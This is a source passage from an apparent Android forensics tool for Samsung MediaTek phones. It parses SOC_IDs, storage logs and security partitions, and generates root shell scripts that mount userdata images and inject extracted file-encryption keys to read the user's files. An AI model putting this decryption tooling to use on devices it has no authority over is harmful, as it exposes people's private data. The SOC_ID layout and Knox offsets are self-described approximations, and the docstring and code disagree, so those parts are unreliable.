class SamsungSOCIDAnalyzer:
    """
    Deep-analyzes the 64-character SOC_ID returned from Samsung MTK devices.

    Structure (reverse-engineered from multiple device dumps):
      Bytes 00-07 (16 hex): Chip family identifier block
      Bytes 08-15 (16 hex): Hardware revision / stepping code
      Bytes 16-31 (32 hex): Device-unique silicon fingerprint
      Bytes 32-47 (32 hex): Security policy block (Knox-related)
      Bytes 48-63 (32 hex): Checksum / verification block

    Note: This structure is research-based approximation. Real Samsung
    SOC_ID structure may differ and is not publicly documented.
    """

    @staticmethod
    def analyze(soc_id_hex: str) -> dict:
        if not soc_id_hex or len(soc_id_hex) != 64:
            return {"error": f"SOC_ID must be exactly 64 hex chars, got {len(soc_id_hex or '')}"}

        h = soc_id_hex.upper()

        chip_family_block    = h[0:16]
        hw_revision_block    = h[16:24]
        silicon_fingerprint  = h[24:48]
        security_policy_blk  = h[48:56]
        verification_block   = h[56:64]

        entropy = SamsungSOCIDAnalyzer._shannon_entropy(h)

        sha256_of_socid = hashlib.sha256(bytes.fromhex(h)).hexdigest().upper()

        derived_device_id = hashlib.sha256(
            bytes.fromhex(silicon_fingerprint)
        ).hexdigest().upper()[:32]

        chip_family_int = int(chip_family_block, 16)
        hw_rev_int      = int(hw_revision_block, 16)
        sec_policy_int  = int(security_policy_blk, 16)

        hw_rev_str = f"{(hw_rev_int >> 16) & 0xFFFF:04X}.{hw_rev_int & 0xFFFF:04X}"

        flags_detected = []
        if sec_policy_int & 0x00000001: flags_detected.append("SECURE_BOOT")
        if sec_policy_int & 0x00000002: flags_detected.append("RPMB_ENROLLED")
        if sec_policy_int & 0x00000004: flags_detected.append("ROLLBACK_PROTECTION")
        if sec_policy_int & 0x00000008: flags_detected.append("FBE_POLICY")
        if sec_policy_int & 0x00000010: flags_detected.append("ATTESTATION_VALID")
        if sec_policy_int & 0x80000000: flags_detected.append("KNOX_WARRANTY_BIT")

        blocks_uniform = all(h[i:i+2] == h[0:2] for i in range(0, 64, 2))

        return {
            "soc_id_hex":            h,
            "total_length_chars":    64,
            "shannon_entropy_bits":  round(entropy, 4),
            "entropy_quality":       "HIGH" if entropy > 3.5 else ("MEDIUM" if entropy > 2.0 else "LOW"),
            "chip_family_block":     chip_family_block,
            "hw_revision_block":     hw_revision_block,
            "hw_revision_human":     hw_rev_str,
            "silicon_fingerprint":   silicon_fingerprint,
            "security_policy_block": security_policy_blk,
            "security_policy_int":   f"0x{sec_policy_int:08X}",
            "security_flags_inferred": flags_detected,
            "verification_block":    verification_block,
            "sha256_of_socid":       sha256_of_socid,
            "derived_device_fingerprint": derived_device_id,
            "all_uniform_bytes":     blocks_uniform,
            "analysis_note": (
                "SOC_ID structure is research-approximated. "
                "Security flags are inferred, not guaranteed."
            ),
        }

    @staticmethod
    def _shannon_entropy(hex_str: str) -> float:
        nibbles = [int(c, 16) for c in hex_str.lower()]
        total = len(nibbles)
        if total == 0:
            return 0.0
        counts = Counter(nibbles)
        entropy = 0.0
        for count in counts.values():
            p = count / total
            if p > 0:
                entropy -= p * math.log2(p)
        return entropy


# ═══════════════════════════════════════════════════════════════════════════
# FEATURE 5 — F2FS FBE STRUCTURE ANALYZER
# ═══════════════════════════════════════════════════════════════════════════

class F2FSFBEAnalyzer:
    """
    Analyzes F2FS + Android FBE (File-Based Encryption) structure.

    Samsung MTK devices use F2FS with Android FBE (fscrypt).
    Key hierarchy:
      Hardware Root Key (Knox Vault / TEE)
        └─ Class Keys (CE/DE per user)
             └─ File/Directory Keys (per inode)

    From log/dump we can extract:
      - Storage info (UFS LU sizes, block size)
      - Partition layout hints
      - FBE policy version
      - Whether RPMB is enrolled (precondition for FBE key wrap)
    """

    _UFS_LU_RE    = re.compile(r'UFS_LU(\d)\s*:\s*(0x[0-9A-Fa-f]+)\s*\(([^)]+)\)', re.I)
    _BLOCK_SIZE_RE= re.compile(r'BLOCK_SIZE\s*:\s*(0x[0-9A-Fa-f]+)\s*\(([^)]+)\)', re.I)
    _UFS_FWVER_RE = re.compile(r'UFS_FWVER\s*:\s*([0-9A-Fa-f]+)', re.I)
    _RAM_EXT_RE   = re.compile(r'EXT_RAM\s*:\s*(0x[0-9A-Fa-f]+)\s*\(([^)]+)\)', re.I)
    _RAM_INT_RE   = re.compile(r'INT_SRAM\s*:\s*(0x[0-9A-Fa-f]+)\s*\(([^)]+)\)', re.I)
    _EOL_RE       = re.compile(r'Pre\s+EOL\s+Info\s*:\s*(\w+)', re.I)
    _LIFETIME_A   = re.compile(r'DeviceLifeTimeEstA\s*:\s*([^\n]+)', re.I)
    _LIFETIME_B   = re.compile(r'DeviceLifeTimeEstB\s*:\s*([^\n]+)', re.I)
    _FS_TYPE_RE   = re.compile(r'Userdata\s+FS\s+Type\s*:\s*(\S+)', re.I)

    @classmethod
    def analyze(cls, log_text: str) -> dict:
        result = {
            "fs_type": None,
            "fbe_version": None,
            "fbe_key_hierarchy": [],
            "ufs_lus": {},
            "block_size": None,
            "block_size_human": None,
            "ufs_fw_ver": None,
            "ext_ram": None,
            "int_sram": None,
            "eol_info": None,
            "lifetime_a": None,
            "lifetime_b": None,
            "total_storage_bytes": 0,
            "total_storage_human": None,
            "storage_health": "UNKNOWN",
            "fbe_key_chain_analysis": {},
            "rpmb_precondition_met": None,
            "notes": [],
        }

        m = cls._FS_TYPE_RE.search(log_text)
        if m:
            result["fs_type"] = m.group(1).strip().upper()
            if result["fs_type"] == "F2FS":
                result["fbe_version"] = "Android FBE v2 (fscrypt policy v2)"
                result["fbe_key_hierarchy"] = [
                    "1. Hardware Root Key (inside Knox Vault / TEEGRIS TEE)",
                    "2. Keymaster/Keymint TA derives wrapping key",
                    "3. CE Key (Credential Encrypted) — unlocks after PIN",
                    "4. DE Key (Device Encrypted) — available at boot",
                    "5. Per-file fscrypt keys derived from CE/DE",
                ]
                result["notes"].append(
                    "F2FS with FBE v2: per-file encryption. "
                    "Root key is hardware-protected inside Samsung Knox Vault."
                )
            elif result["fs_type"] == "EXT4":
                result["fbe_version"] = "Android FBE v1 (fscrypt policy v1)"
                result["fbe_key_hierarchy"] = [
                    "1. Hardware Root Key (TEE/TrustZone)",
                    "2. KeyMaster HAL derives disk key",
                    "3. EXT4 encryption key (single key per directory)",
                ]

        for m in cls._UFS_LU_RE.finditer(log_text):
            lu_num = int(m.group(1))
            size_hex = m.group(2)
            size_human = m.group(3).strip()
            size_bytes = int(size_hex, 16)
            result["ufs_lus"][f"LU{lu_num}"] = {
                "size_hex": size_hex.upper(),
                "size_bytes": size_bytes,
                "size_human": size_human,
            }
            result["total_storage_bytes"] += size_bytes

        if result["total_storage_bytes"] > 0:
            total_gb = result["total_storage_bytes"] / (1024**3)
            result["total_storage_human"] = f"{total_gb:.2f} GB"

        m = cls._BLOCK_SIZE_RE.search(log_text)
        if m:
            result["block_size"] = m.group(1).upper()
            result["block_size_human"] = m.group(2).strip()

        m = cls._UFS_FWVER_RE.search(log_text)
        if m:
            result["ufs_fw_ver"] = m.group(1).strip()

        m = cls._RAM_EXT_RE.search(log_text)
        if m:
            result["ext_ram"] = m.group(2).strip()

        m = cls._RAM_INT_RE.search(log_text)
        if m:
            result["int_sram"] = m.group(2).strip()

        m = cls._EOL_RE.search(log_text)
        if m:
            result["eol_info"] = m.group(1).strip()
            result["storage_health"] = "GOOD" if result["eol_info"].lower() == "normal" else "WARNING"

        m = cls._LIFETIME_A.search(log_text)
        if m:
            result["lifetime_a"] = m.group(1).strip()

        m = cls._LIFETIME_B.search(log_text)
        if m:
            result["lifetime_b"] = m.group(1).strip()

        result["fbe_key_chain_analysis"] = {
            "step_1_hw_root_key":   "Inside Knox Vault — NOT externally accessible",
            "step_2_keymaster_ta":  "Runs inside TEEGRIS/Kinibi TEE",
            "step_3_ce_key":        "Requires PIN/password unlock",
            "step_4_de_key":        "Available after boot (no PIN needed)",
            "step_5_fscrypt_keys":  "Per-file, derived on demand",
            "external_derivation":  "IMPOSSIBLE without Knox Vault access",
        }

        result["notes"].append(
            "LU0/LU1 are typically RPMB and boot partitions. "
            "LU2 is main storage containing userdata (F2FS encrypted)."
        )

        return result


# ═══════════════════════════════════════════════════════════════════════════
# FEATURE 5.1 — ANDROID FBE DECRYPTOR (v11.4 Tactical Execution Update)
# ═══════════════════════════════════════════════════════════════════════════

class AndroidFBEDecryptor:
    """
    v11.4 — Android FBE Decryptor: Hardware-independent command generator.
    Takes extracted CE/DE keys (hex) and a raw F2FS userdata image dump,
    then generates ready-to-execute Linux/WSL terminal commands for
    forensic decryption and mounting.

    ── FBE v2 DEEP ARCHITECTURE (Android 10+ / Samsung One UI 3+) ──
    Android File-Based Encryption v2 uses the Linux kernel fscrypt API
    (introduced in v5.4, backported to some 4.19 vendor kernels).

    Key Hierarchy:
      1. Knox Vault Root Key (Hardware-backed, never leaves TrustZone)
      2. Master Key (Derived from Knox Vault + SALT, stored in TEE keyrefuge)
      3. CE Key / DE Key (Per-user master keys, 64 bytes raw = AES-256-XTS)
      4. Per-File Key (Derived from master key + policy nonce via HKDF-SHA512)

    FBE v2 Policy Differences from v1:
      • v1 used key_spec.type = 1 (DESCRIPTOR, 8-byte descriptor).
        Required CAP_SYS_ADMIN. Key was identified by a raw 8-byte descriptor.
      • v2 uses key_spec.type = 2 (IDENTIFIER, 16-byte hash).
        Does NOT require privileges (user quota limited). The kernel computes
        the identifier as HKDF-SHA512(key, "fscrypt\0v2 key identifier")[0:16].
        This means the analyst only needs the raw key; the identifier is
        derived automatically by the kernel upon ioctl.

    Metadata Encryption (dm-default-key or fscrypt metadata):
      • Samsung devices with FBE v2 often enable metadata encryption on
        the userdata partition (Android 11+ mandatory for adoptable storage).
      • The "metadata key" is NOT the same as CE/DE keys. It decrypts the
        F2FS superblock, node blocks, and directory structures.
      • Without the metadata key, mount(2) returns -EIO or "can't find
        valid F2FS filesystem" because the superblock is unreadable.
      • Metadata encryption is usually set up via dm-default-key (inline
        encryption hw) or dm-crypt (software fallback) by vold during boot.

    IOCTL Mechanics (FS_IOC_ADD_ENCRYPTION_KEY):
      • ioctl_num = _IOWR('f', 23, sizeof(struct fscrypt_add_key_arg))
        On x86_64: 0xC0506617
      • Struct layout (verified against linux/include/uapi/linux/fscrypt.h):
          struct fscrypt_key_specifier {  // 40 bytes
              __u32 type;       // 2 = IDENTIFIER for v2
              __u32 __reserved;
              union { __u8 __reserved[32]; ... } u;  // 32 bytes
          };
          struct fscrypt_add_key_arg {   // 80 bytes base + flexible raw[]
              struct fscrypt_key_specifier key_spec;
              __u32 raw_size;   // len(key_raw)
              __u32 key_id;     // 0 (key given directly)
              __u32 flags;      // 0 (or FSCRYPT_ADD_KEY_FLAG_HW_WRAPPED)
              __u32 __reserved[7];  // 28 bytes, MUST be zeroed
              __u8 raw[];       // actual key bytes (64 for AES-256-XTS)
          };
      • The ioctl is issued on any file or directory INSIDE the mounted
        filesystem (typically the filesystem root). The kernel adds the
        key to the per-superblock master_keys keyring.

    [RESEARCH / SIMULATION MODE ONLY] FBE v3 / Hardware-Wrapped Keys:
      • As of kernel 6.8, there is NO formal "fscrypt policy v3" or "FBE v3".
        The latest stable specification remains fscrypt v2.
      • The next evolution is likely "Hardware-Wrapped Keys" (blk-crypto
        inline encryption + UFS/EMMC hardware keyslots). Already partially
        supported via FSCRYPT_ADD_KEY_FLAG_HW_WRAPPED (0x01), but this
        requires vendor-specific TEE / ICE (Inline Crypto Engine) support.
      • [RESEARCH / SIMULATION MODE ONLY] Samsung devices with Exynos 2100+
        and Snapdragon 888+ use a proprietary "Knox Wrapped Key" flow where
        the CE/DE key is encrypted by the SoC's hardware root key and passed
        to the kernel as a wrapped blob. Offline direct decryption is
        IMPOSSIBLE without the hardware unwrapping key. Reverse-engineering
        requires extracting the AES-GCM wrapping key from the TEE keymaster
        TA, which MUST be done via the MicroEmulator / Unicorn TrustZone
        simulation engine (Arsenal Tab), NOT via standard offline mount+ioctl.
      • OmniMTK will monitor the linux-fscrypt mailing list for v3 policy
        drafts. When v3 stabilises, the struct layout and ioctl numbers
        will be updated in a future release.

    v11.3 CRITICAL CHANGES:
      1. Metadata decryption order: losetup → cryptsetup mapper → mount mapper.
      2. FBE v2 support via inline Python fcntl.ioctl (FS_IOC_ADD_ENCRYPTION_KEY)
         with keyctl legacy fallback, eliminating sole dependency on keyctl.
      3. Keys are always converted from hex → raw bytes before injection.
      4. Forensic mount flags: disable_roll_forward prevents kernel recovery
         writes, preserving the forensic hash of the evidence image.

    This class NEVER executes commands automatically (security policy).
    It returns a structured command dictionary that the analyst can:
      1. Review in the GUI console.
      2. Copy to clipboard.
      3. Paste into a root terminal or WSL session.
      4. Optionally execute via the "Run in Terminal" button.
    """

    FSCRYPT_MODES = {
        0x01: ("AES-256-XTS", 64),
        0x02: ("AES-256-CTS", 32),
        0x03: ("AES-128-CBC", 16),
    }

    _RE_HEX = re.compile(r"^[0-9A-Fa-f]+$")

    @classmethod
    def _hex_to_raw(cls, hex_str: str, expected_bytes: int = None) -> bytes:
        """Normalize and validate a hex key string. Returns raw bytes or None.
        v11.4: aggressively strips whitespace, hyphens, colons, and 0x prefixes
        to survive keys pasted from PDFs, chat apps, and hex editors.
        """
        if not hex_str:
            return None
        # v11.4 FIX: strip ALL whitespace (space, tab, newline, carriage return),
        # hyphens, colons, and 0x prefixes before validation.
        hex_str = hex_str.strip()
        for ch in (" ", "\t", "\n", "\r", "-", ":", "0x"):
            hex_str = hex_str.replace(ch, "")
        if not cls._RE_HEX.match(hex_str):
            return None
        try:
            raw = bytes.fromhex(hex_str)
        except ValueError:
            return None
        if expected_bytes and len(raw) != expected_bytes:
            return None
        return raw

    @classmethod
    def _escape_sh(cls, s: str) -> str:
        """Escape a string for safe insertion into bash single-quoted context."""
        return s.replace("'", "'\"'\"'")

    @classmethod
    def _build_inline_python_injector(
        cls, mount_point: str, ce_key_hex: str, de_key_hex: str
    ) -> str:
        """
        v11.3 — Build a self-contained inline Python script that injects
        CE/DE keys into the kernel via fcntl.ioctl (FS_IOC_ADD_ENCRYPTION_KEY)
        for FBE v2 compatibility, falling back to keyctl for legacy systems.
        The script is embedded inside the generated bash one-liner via heredoc.

        KERNEL STRUCT LAYOUT (linux/fscrypt.h, verified against v5.4+):
          struct fscrypt_key_specifier {
              __u32 type;              // 4 B  → 2 = FSCRYPT_KEY_SPEC_TYPE_IDENTIFIER (v2)
              __u32 __reserved;        // 4 B
              union { __u8 __reserved[32]; ... } u;   // 32 B
          };                                      // = 40 B
          struct fscrypt_add_key_arg {
              struct fscrypt_key_specifier key_spec;  // 40 B
              __u32 raw_size;          // 4 B
              __u32 key_id;            // 4 B
              __u32 flags;             // 4 B
              __u32 __reserved[7];     // 28 B
              __u8 raw[];              // flexible array
          };                                      // base = 80 B

        FS_IOC_ADD_ENCRYPTION_KEY = _IOWR('f', 23, struct fscrypt_add_key_arg)
        On x86_64: 0xC0506617  (dir=3, type=0x66, nr=23, size=80)
        """
        lines = [
            '#!/usr/bin/env python3',
            '"""OmniMTK v13.0 — Inline FBE Key Injector (FBE v2 ioctl + keyctl fallback)"""',
            'import fcntl, struct, os, sys, subprocess',
            '',
            'def _hex_to_bytes(h):',
            "    h = h.strip().replace(' ', '').replace('0x', '').replace('0X', '')",
            '    return bytes.fromhex(h) if h else b""',
            '',
            'def _add_key(mount_path, key_hex, key_type):',
            '    key_raw = _hex_to_bytes(key_hex)',
            '    if not key_raw:',
            '        return',
            '',
            '    # ── Attempt 1: fcntl.ioctl FS_IOC_ADD_ENCRYPTION_KEY (FBE v2) ──',
            '    _IOC_WRITE = 1',
            '    _IOC_READ = 2',
            '    _IOC_NRBITS = 8',
            '    _IOC_TYPEBITS = 8',
            '    _IOC_SIZEBITS = 14',
            '    _IOC_NRSHIFT = 0',
            '    _IOC_TYPESHIFT = 8',
            '    _IOC_SIZESHIFT = 16',
            '    _IOC_DIRSHIFT = 30',
            '',
            '    def _IOWR(t, nr, size):',
            '        return ((_IOC_READ | _IOC_WRITE) << _IOC_DIRSHIFT) | (size << _IOC_SIZESHIFT) | (t << _IOC_TYPESHIFT) | (nr << _IOC_NRSHIFT)',
            '',
            '    # Base header size of struct fscrypt_add_key_arg (before flexible raw[])',
            '    # key_spec(40) + raw_size(4) + key_id(4) + flags(4) + __reserved[7](28) = 80',
            '    HEADER = 80',
            '',
            '    # Pack structure. type=2 (FSCRYPT_KEY_SPEC_TYPE_IDENTIFIER).',
            '    # The kernel derives the actual identifier from the key via HKDF-SHA512.',
            "    buf = struct.pack('<II', 2, 0) + b'\\x00' * 32   # key_spec (40 B)",
            "    buf += struct.pack('<III', len(key_raw), 0, 0)    # raw_size, key_id, flags",
            "    buf += b'\\x00' * 28                              # __reserved[7] (28 B)",
            '    buf += key_raw                                    # raw key bytes',
            '',
            '    fd = os.open(mount_path, os.O_RDONLY | os.O_DIRECTORY)',
            '    try:',
            '        # Exact ioctl for x86_64 / most arches (size=80); fallback to size=0',
            '        for size in [HEADER, 0]:',
            '            ioctl_num = _IOWR(0x66, 23, size)',
            '            try:',
            '                arg = buf if size == 0 else (buf + b"\\x00" * (size - len(buf)) if len(buf) < size else buf[:size])',
            '                fcntl.ioctl(fd, ioctl_num, arg)',
            "                print(f'[OK] ioctl(0x{ioctl_num:08X}): {key_type} key added ({len(key_raw)} B)')",
            '                return',
            '            except OSError as e:',
            '                last_err = e',
            '                continue',
            '        # If both ioctl attempts failed, report but do NOT exit (allow keyctl fallback)',
            "        print(f'[WARN] ioctl failed for {key_type}: {last_err}')",
            '    finally:',
            '        os.close(fd)',
            '',
            '    # ── Attempt 2: keyctl (legacy FBE v1 / compatibility fallback) ──',
            '    try:',
            "        proc = subprocess.run(",
            "            ['keyctl', 'add', 'logon', f'fscrypt:0:{key_type}', '', '@s'],",
            '            input=key_raw, check=True, capture_output=True',
            '        )',
            "        print(f'[OK] keyctl: {key_type} key added ({len(key_raw)} B)')",
            '        return',
            '    except (FileNotFoundError, subprocess.CalledProcessError):',
            '        pass',
            '',
            "    print(f'[FAIL] Could not add {key_type} key via ioctl or keyctl', file=sys.stderr)",
            '    sys.exit(1)',
            '',
            f'MOUNT = {repr(mount_point)}',
            f'CE_KEY = {repr(ce_key_hex)}',
            f'DE_KEY = {repr(de_key_hex)}',
            '',
            "if DE_KEY: _add_key(MOUNT, DE_KEY, 'de')",
            "if CE_KEY: _add_key(MOUNT, CE_KEY, 'ce')",
        ]
        return "\n".join(lines)

    @classmethod
    def build_command_set(
        cls,
        image_path: str,
        ce_key_hex: str = "",
        de_key_hex: str = "",
        metadata_key_hex: str = "",
        mount_point: str = "/mnt/omnimtk_userdata",
        user_id: int = 0,
    ) -> dict:
        """
        Generate a complete forensic command set for decrypting an Android
        F2FS userdata image using extracted CE/DE keys.

        v11.4 Decryption Order (when metadata key present):
          1. losetup → attach image to loop device.
          2. cryptsetup open --type plain → create /dev/mapper/omnimtk_userdata_dec.
          3. mount → mount the mapper device (NOT the raw loop device).

        Returns dict with:
            status          : "READY" | "PARTIAL" | "MISSING_KEYS" | "ERROR"
            image_path      : validated absolute path
            mount_point     : target mount directory
            ce_key_valid    : bool
            de_key_valid    : bool
            meta_key_valid  : bool
            commands        : list of {step, description, command, risky}
            warnings        : list of advisory strings
            one_liner       : single paste-able script (for WSL/SSH)
        """
        result = {
            "status": "MISSING_KEYS",
            "image_path": "",
            "mount_point": mount_point,
            "ce_key_valid": False,
            "de_key_valid": False,
            "meta_key_valid": False,
            "commands": [],
            "warnings": [],
            "one_liner": "",
        }

        if not image_path or not os.path.isfile(image_path):
            result["status"] = "ERROR"
            result["warnings"].append(f"Image not found: {image_path}")
            return result

        result["image_path"] = str(Path(image_path).resolve())
        img_escaped = cls._escape_sh(result["image_path"])
        mnt_escaped = cls._escape_sh(mount_point)

        ce_raw = cls._hex_to_raw(ce_key_hex, expected_bytes=64)
        de_raw = cls._hex_to_raw(de_key_hex, expected_bytes=64)
        meta_raw = cls._hex_to_raw(metadata_key_hex)

        result["ce_key_valid"] = ce_raw is not None
        result["de_key_valid"] = de_raw is not None
        result["meta_key_valid"] = meta_raw is not None

        cmds = []

        # ── Step 0: Pre-flight checks ────────────────────────────────────
        cmds.append({
            "step": 0,
            "description": "Pre-flight: verify root privileges and required tools",
            "command": "sudo -n true 2>/dev/null || { echo '[FAIL] Root required'; exit 1; }",
            "risky": False,
        })
        cmds.append({
            "step": 0,
            "description": "Check that losetup, mount, python3 are available",
            "command": "command -v losetup >/dev/null && command -v mount >/dev/null && command -v python3 >/dev/null || { echo '[FAIL] Missing losetup/mount/python3'; exit 1; }",
            "risky": False,
        })

        # ── Step 1: Create mount point ───────────────────────────────────
        cmds.append({
            "step": 1,
            "description": "Create mount point directory",
            "command": f"sudo mkdir -p '{mnt_escaped}'",
            "risky": False,
        })

        # ── Step 2: Attach loop device ───────────────────────────────────
        cmds.append({
            "step": 2,
            "description": "Attach raw image to a free loop device",
            "command": f"LOOP_DEV=$(sudo losetup -f --show '{img_escaped}') && echo \"[INFO] Loop device: $LOOP_DEV\"",
            "risky": False,
        })

        # ── Step 3: Optional dm-crypt for metadata encryption ──────────
        if meta_raw:
            meta_hex = meta_raw.hex()
            cmds.append({
                "step": 3,
                "description": "Open dm-crypt mapper for metadata-encrypted F2FS (dm-default-key style)",
                "command": (
                    f"echo '{meta_hex}' | xxd -r -p | sudo cryptsetup open --type plain "
                    f"--cipher aes-xts-plain64 --key-size {len(meta_raw)*8} "
                    f"--offset 0 \"$LOOP_DEV\" omnimtk_userdata_dec --key-file -"
                ),
                "risky": True,
            })
            loop_for_mount = "/dev/mapper/omnimtk_userdata_dec"
        else:
            loop_for_mount = "$LOOP_DEV"
            result["warnings"].append(
                "No metadata encryption key supplied. Assuming plaintext F2FS superblock. "
                "If metadata encryption is active, mount will fail with I/O errors."
            )

        # ── Step 4: Mount F2FS read-only with forensic flags ────────────
        # v11.3: disable_roll_forward prevents the kernel from rolling forward
        # the F2FS checkpoint or replaying the journal, guaranteeing ZERO writes
        # to the evidence image and preserving the forensic hash.
        # If the kernel does not support this option, we print a warning and
        # fall back to ro,noload automatically.
        cmds.append({
            "step": 4,
            "description": (
                "Mount F2FS read-only + disable_roll_forward (prevents kernel "
                "recovery writes, preserving forensic hash). Falls back to "
                "ro,noload automatically if unsupported."
            ),
            "command": (
                f"sudo mount -o ro,noload,disable_roll_forward -t f2fs "
                f"{loop_for_mount} '{mnt_escaped}' || {{ "
                f"echo '[WARN] disable_roll_forward not supported by this kernel — "
                f"retrying with ro,noload only (forensic hash still protected by ro)'; "
                f"sudo mount -o ro,noload -t f2fs {loop_for_mount} '{mnt_escaped}'; "
                f"}} || {{ echo '[FAIL] F2FS mount failed (try ext4?)'; exit 1; }}"
            ),
            "risky": False,
        })

        # ── Step 5: Inline Python key injector via stdin (FBE v2 ioctl) ──
        # v11.4 OPSEC FIX: Keys NEVER touch disk. The script is piped directly
        # to python3 via stdin heredoc, keeping CE/DE keys in RAM only.
        if ce_raw or de_raw:
            py_script = cls._build_inline_python_injector(
                mount_point, ce_key_hex if ce_raw else "", de_key_hex if de_raw else ""
            )
            cmds.append({
                "step": 5,
                "description": (
                    "Inject CE/DE keys via inline Python (FBE v2 fcntl.ioctl + keyctl fallback) "
                    "— keys stay in RAM only, no disk trace"
                ),
                "command": (
                    "python3 - << 'OMNIMTK_PYEOF'\n"
                    + py_script
                    + "\nOMNIMTK_PYEOF"
                ),
                "risky": True,
            })
        else:
            result["warnings"].append(
                "CE and DE Keys both missing. No files will be decryptable."
            )

        # ── Step 7: List decrypted contents ──────────────────────────────
        cmds.append({
            "step": 7,
            "description": "List recovered user data (first 20 entries)",
            "command": f"sudo ls -la '{mnt_escaped}' | head -n 20",
            "risky": False,
        })

        # ── Step 8: Unmount & cleanup (manual advisory) ──────────────────
        cmds.append({
            "step": 8,
            "description": "[ADVISORY] Unmount and detach when finished",
            "command": f"sudo umount '{mnt_escaped}' && sudo losetup -d \"$LOOP_DEV\" && echo '[INFO] Cleaned up'",
            "risky": False,
        })

        result["commands"] = cmds

        # Build one-liner script
        lines = [
            "#!/usr/bin/env bash",
            "# ── OmniMTK v13.0 — Android FBE Decryption Script ──",
            f"# Image : {result['image_path']}",
            f"# Mount : {mount_point}",
            f"# CE Key: {'VALID (' + str(len(ce_raw)) + ' B)' if ce_raw else 'MISSING'}",
            f"# DE Key: {'VALID (' + str(len(de_raw)) + ' B)' if de_raw else 'MISSING'}",
            f"# Meta  : {'VALID (' + str(len(meta_raw)) + ' B)' if meta_raw else 'NOT SUPPLIED'}",
            "set -euo pipefail",
            "",
            "# v11.3 OPSEC: Enforce root privileges before any loop or mapper creation",
            'if [ "${EUID:-$(id -u)}" -ne 0 ]; then echo "[FAIL] Please run as root (sudo)"; exit 1; fi',
        ]
        for c in cmds:
            lines.append(f"# Step {c['step']}: {c['description']}")
            if c['risky']:
                lines.append("# ⚠️  RISKY — verify before executing")
            lines.append(c['command'])
            lines.append("")
        result["one_liner"] = "\n".join(lines)

        # Determine status
        if ce_raw or de_raw:
            result["status"] = "READY" if (ce_raw and de_raw) else "PARTIAL"
        else:
            result["status"] = "MISSING_KEYS"
            result["warnings"].append(
                "At least one of CE Key or DE Key is required for any decryption."
            )

        return result

    @classmethod
    def generate_standalone_decryptor(
        cls,
        image_path: str,
        ce_key_hex: str = "",
        de_key_hex: str = "",
        output_script_path: str = "omnimtk_decrypt.sh",
    ) -> dict:
        """
        v13.0 — Generate a standalone bash script strictly in RAM.
        No automatic disk write. The script lives only in the returned dict
        until the user explicitly clicks 'Export Standalone Script'.
        """
        cmd_set = cls.build_command_set(
            image_path=image_path,
            ce_key_hex=ce_key_hex,
            de_key_hex=de_key_hex,
        )
        script = cmd_set["one_liner"]
        cmd_set["standalone_script"] = script
        cmd_set["script_written"] = None
        cmd_set["warnings"].append(
            "v13.0 OPSEC: Standalone script generated in RAM only. "
            "Use the 'Export Standalone Script' button to write to disk."
        )
        return cmd_set


# ═══════════════════════════════════════════════════════════════════════════
# FEATURE 2 — SAMSUNG PARTITION ANALYZER
# ═══════════════════════════════════════════════════════════════════════════

# Samsung-specific partitions and their forensic value
SAMSUNG_PARTITION_MAP = {
    "sec":          {"type": "Samsung Security Config",    "encrypted": True,  "priority": "HIGH",   "desc": "Knox security state, warranty bit, attestation keys"},
    "keystorage":   {"type": "Keymaster Key Storage",      "encrypted": True,  "priority": "HIGH",   "desc": "Hardware-backed keys wrapped by TEE"},
    "tz":           {"type": "TrustZone Binary",           "encrypted": False, "priority": "MEDIUM", "desc": "TEEGRIS/Kinibi TEE binary image"},
    "tee":          {"type": "TEE Partition",              "encrypted": True,  "priority": "HIGH",   "desc": "Trusted Execution Environment storage"},
    "sboot":        {"type": "Samsung Bootloader",         "encrypted": False, "priority": "LOW",    "desc": "Samsung-signed secondary bootloader"},
    "proinfo":      {"type": "MTK Provisioning Info",      "encrypted": False, "priority": "HIGH",   "desc": "RPMB seed, provisioning keys (shared with MTK)"},
    "seccfg":       {"type": "MTK Security Config",        "encrypted": False, "priority": "HIGH",   "desc": "Device lock state (shared with MTK)"},
    "devinfo":      {"type": "MTK Device Info",            "encrypted": False, "priority": "MEDIUM", "desc": "Provisioning key (shared with MTK)"},
    "nvdata":       {"type": "Non-Volatile Data",          "encrypted": False, "priority": "MEDIUM", "desc": "RPMB counter, modem calibration"},
    "metadata":     {"type": "Android Metadata",           "encrypted": False, "priority": "MEDIUM", "desc": "FBE key wrapping metadata (vold)"},
    "userdata":     {"type": "User Data (F2FS+FBE)",       "encrypted": True,  "priority": "HIGH",   "desc": "All user data, encrypted with FBE"},
    "vbmeta":       {"type": "Verified Boot Metadata",     "encrypted": False, "priority": "LOW",    "desc": "AVB public keys, rollback index"},
    "dtbo":         {"type": "Device Tree Blob Overlay",   "encrypted": False, "priority": "LOW",    "desc": "Hardware configuration"},
}

SAMSUNG_SEC_PARTITION_OFFSETS = {
    "knox_warranty_fuse":  0x0000,
    "attestation_key_ref": 0x0040,
    "rollback_version":    0x0080,
    "oem_lock_state":      0x00C0,
    "tee_type_indicator":  0x0100,
    "reserved_block":      0x0200,
}


class SamsungPartitionAnalyzer:
    """
    Analyzes Samsung-specific partition dumps.
    Extracts Knox warranty bit, lock state, TEE type indicator,
    and security metadata from the SEC partition and others.
    """

    @staticmethod
    def analyze_sec_partition(data: bytes) -> dict:
        result = {
            "partition": "sec",
            "size_bytes": len(data),
            "knox_warranty_fuse_region": None,
            "knox_warranty_tripped": None,
            "oem_lock_state_region": None,
            "tee_type_region": None,
            "tee_type_inferred": None,
            "rollback_version_region": None,
            "warnings": [],
            "notes": [],
        }

        if len(data) < 0x210:
            result["warnings"].append(f"SEC partition too small ({len(data)} bytes), expected ≥ 0x210")
            return result

        fuse_region = data[0x0000:0x0040]
        result["knox_warranty_fuse_region"] = fuse_region.hex().upper()
        all_zeros = all(b == 0x00 for b in fuse_region)
        all_ones  = all(b == 0xFF for b in fuse_region)
        if all_zeros:
            result["knox_warranty_tripped"] = False
            result["notes"].append("Knox warranty fuse region is all-zeros → NOT tripped (or unread).")
        elif all_ones:
            result["knox_warranty_tripped"] = True
            result["warnings"].append("Knox warranty fuse region is all-0xFF → WARRANTY TRIPPED.")
        else:
            result["knox_warranty_tripped"] = "INDETERMINATE"
            result["notes"].append("Knox warranty fuse region has mixed data — manual analysis needed.")

        if len(data) >= SAMSUNG_SEC_PARTITION_OFFSETS["oem_lock_state"] + 0x40:
            lock_region = data[0x00C0:0x0100]
            result["oem_lock_state_region"] = lock_region.hex().upper()
            if lock_region[0] == 0x00:
                result["notes"].append("OEM lock state byte=0x00 → device appears UNLOCKED.")
            elif lock_region[0] == 0x01:
                result["notes"].append("OEM lock state byte=0x01 → device appears LOCKED.")

